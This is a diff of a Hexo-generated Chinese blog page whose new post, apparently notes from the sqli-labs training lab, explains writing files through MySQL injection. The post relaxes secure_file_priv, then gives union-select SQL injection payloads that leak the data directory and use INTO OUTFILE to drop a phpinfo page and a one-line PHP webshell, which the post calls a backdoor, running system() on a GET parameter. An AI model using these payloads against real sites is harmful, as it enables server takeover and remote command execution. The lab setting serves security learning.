@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——tags | Hexo</title>
+  <title>我的技术与生活——MySQL控制网站 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——tags`
+    document.title = `我的技术与生活——MySQL控制网站`
   </script>
 <meta name="generator" content="Hexo 6.3.0"></head>
 
@@ -340,14 +340,118 @@
       <div id="main-container" class="main-container">
 
 
-  <link rel="stylesheet" href="/css/partial/tags.css" />
+  <link rel="stylesheet" href="/css/partial/article.css" />
 
-<div class="tags">
-  <h2 class="tags-title">小站标签</h2>
-  <div class="tags-list">
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">MySQL控制网站</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2024-01-05 14:44:01</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <p>mysql控制网站  （在浏览器上控制别人电脑）<br>前提：1.在小皮里找到对应的MySQL配置文件进行修改<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1703929269226-028002fe-4a6b-4173-85b3-3dbbc348d5e9.png" alt="image.png"></p>
+<p>NULL代表不能在任何地方输出文件<br>@@datadir (数据库路径)<br>?id&#x3D;-1’ union select 1,@@datadir,@@secure_file_priv – -<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1703929538827-7d70741f-c09d-4317-ac59-bbb1c02344a0.png" alt="image.png"><br>加上secure_file_priv&#x3D;””  ，置为空，重启数据库。<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1703929662652-71719221-dbe0-4eca-9fb4-24c769c134d6.png" alt="image.png"><br>现在就可以在任意位置进行输出文件<br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1703929866686-b4e85e1e-3d6e-4224-8101-88e7808e9bb0.png" alt="image.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php.phpinfo(); ?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo.php&quot; <span class="comment">-- -  (在数据库网站根目录下生成PHP版本信息的文件)</span></span><br><span class="line"></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo2.php&quot; -- -</span></span><br><span class="line"><span class="string">#一个后门，用get传参数a，一个webshell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704094856451-ed4416c1-4c18-4099-826b-ef009f526dc9.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704094947479-d323de81-d121-42bb-9713-177bdea8a776.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1704095029974-333bc3e7-a25f-47f6-807c-71dc625bb4d1.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/xiaoshenhe/tuchuang/main/img/1703931124868-b0cae3dd-059f-4cc1-83da-823d941d1471.png" alt="image.png"></p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2024/01/05/MySQL控制网站/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
     
   </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2024/01/05/sqlmap/">sqlmap</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/01/01/sqli-less/">sqli_less</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
 </div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2024/01/05/MySQL控制网站/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
 
 </div>
       <div class="main-right-wrapper"><div class="main-right">
